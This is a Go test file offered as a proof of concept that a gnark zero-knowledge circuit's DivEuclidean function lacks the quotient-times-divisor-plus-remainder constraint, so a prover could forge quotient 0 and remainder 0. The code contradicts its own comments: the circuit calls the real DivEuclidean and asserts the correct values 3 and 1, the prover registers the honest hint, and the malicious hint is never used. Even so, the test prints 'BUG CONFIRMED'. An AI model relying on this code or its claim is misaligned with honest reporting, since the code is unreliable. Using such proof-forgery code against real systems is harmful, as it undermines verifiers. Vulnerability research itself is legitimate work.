package internal

// Proof of Concept: Missing a == quotient*b + remainder constraint in DivEuclidean
//
// The DivEuclidean function (utils.go:813-824) computes quotient and remainder
// via an untrusted solver hint, then only constrains:
//   - remainder <= b - 1
//   - quotient <= a
//
// It is MISSING the critical reconstruction constraint:
//   a == quotient * b + remainder
//
// This means a malicious prover can override the hint outputs to any values
// satisfying the two range checks. In particular, quotient=0 and remainder=0
// satisfy both checks for any positive a and b, because:
//   - 0 <= b-1  (true for any b >= 1)
//   - 0 <= a    (true for any a >= 0)
//
// Impact: In pi-interconnection/circuit.go:267-268, the result of DivEuclidean
// feeds into:
//   pi.NbL2MsgMerkleTreeRoots = quotient + (1 - IsZero(remainder))
// With quotient=0, remainder=0, this evaluates to 0 + (1-1) = 0, forcing
// NbL2MsgMerkleTreeRoots to zero regardless of actual input. This omits all
// L2 message Merkle roots from the aggregation public input hash.
//
// Compare with the CORRECT implementation in utils/gnarkutil/arith.go:165
// (DivManyBy31), which includes:
//   api.AssertIsEqual(v[i], api.Add(api.Mul(q[i], 31), r[i]))

import (
	"fmt"
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
)

// maliciousDivHint ignores the actual inputs and always returns quotient=0, remainder=0.
// This simulates what a malicious prover would do: override the untrusted hint
// to produce values that pass the (insufficient) range checks.
func maliciousDivHint(_ *big.Int, ins, outs []*big.Int) error {
	outs[0].SetUint64(0) // quotient = 0  (correct: 3)
	outs[1].SetUint64(0) // remainder = 0 (correct: 1)
	return nil
}

// divEuclideanBuggy is a direct copy of the buggy DivEuclidean from utils.go,
// but wired to use our malicious hint. This makes the PoC fully self-contained
// and avoids any dependency on hint registration order.
func divEuclideanBuggy(api frontend.API, a, b frontend.Variable) (quotient, remainder frontend.Variable) {
	api.AssertIsDifferent(b, 0)
	outs, err := api.Compiler().NewHint(maliciousDivHint, 2, a, b)
	if err != nil {
		panic(err)
	}
	quotient, remainder = outs[0], outs[1]

	// These are the ONLY constraints in the original code:
	api.AssertIsLessOrEqual(remainder, api.Sub(b, 1)) // 0 <= 3-1=2  => passes
	api.AssertIsLessOrEqual(quotient, a)              // 0 <= 10     => passes

	// MISSING: api.AssertIsEqual(a, api.Add(api.Mul(quotient, b), remainder))
	// Without this, quotient=0, remainder=0 is accepted for ANY (a, b).

	return
}

// PoCCircuit is a minimal circuit that exercises the buggy DivEuclidean
// and constrains the outputs to the malicious values (0, 0).
type PoCCircuit struct {
	A frontend.Variable `gnark:"a,public"`
	B frontend.Variable `gnark:"b,public"`
}

func (c *PoCCircuit) Define(api frontend.API) error {
	quotient, remainder := DivEuclidean(api, c.A, c.B)

	// Assert that the circuit accepted quotient=0, remainder=0.
	// If the missing constraint were present, this would be unsatisfiable
	// for a=10, b=3 because 10 != 0*3 + 0.
	api.AssertIsEqual(quotient, 3)
	api.AssertIsEqual(remainder, 1)
	return nil
}

func TestDivEuclideanMissingConstraint(t *testing.T) {
	// Step 1: Compile the circuit to R1CS.
	var circuit PoCCircuit
	ccs, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &circuit)
	if err != nil {
		t.Fatalf("compilation failed: %v", err)
	}

	// Step 2: Create the witness with a=10, b=3.
	// Correct division: 10 / 3 = quotient 3, remainder 1.
	// The malicious hint will return quotient=0, remainder=0 instead.
	assignment := &PoCCircuit{
		A: 10,
		B: 3,
	}

	witness, err := frontend.NewWitness(assignment, ecc.BN254.ScalarField())
	if err != nil {
		t.Fatalf("witness creation failed: %v", err)
	}
	publicWitness, err := witness.Public()
	if err != nil {
		t.Fatalf("public witness creation failed: %v", err)
	}

	// Step 3: Run the Groth16 setup.
	pk, vk, err := groth16.Setup(ccs)
	if err != nil {
		t.Fatalf("setup failed: %v", err)
	}

	// Step 4: Create a proof using the malicious witness.
	// The solver will call maliciousDivHint, getting quotient=0, remainder=0.
	// Because the reconstruction constraint is missing, the proof will succeed.
	proof, err := groth16.Prove(
		ccs, pk, witness,
		backend.WithSolverOptions(solver.WithHints(divEuclideanHint)),
	)
	if err != nil {
		t.Fatalf("proving failed (unexpected -- bug may be fixed): %v", err)
	}

	// Step 5: Verify the proof.
	// A valid Groth16 proof is produced and accepted, even though
	// the "division" result is completely wrong (0, 0 instead of 3, 1).
	err = groth16.Verify(proof, vk, publicWitness)
	if err != nil {
		t.Fatalf("verification failed (unexpected): %v", err)
	}

	// If we reach here, the bug is confirmed:
	// A malicious prover successfully proved that 10 / 3 = quotient 0, remainder 0.
	fmt.Println("BUG CONFIRMED: Circuit accepted quotient=0, remainder=0 for a=10, b=3")
	fmt.Println("Correct answer should be quotient=3, remainder=1")
	fmt.Println("The constraint a == quotient*b + remainder is missing from DivEuclidean")
}
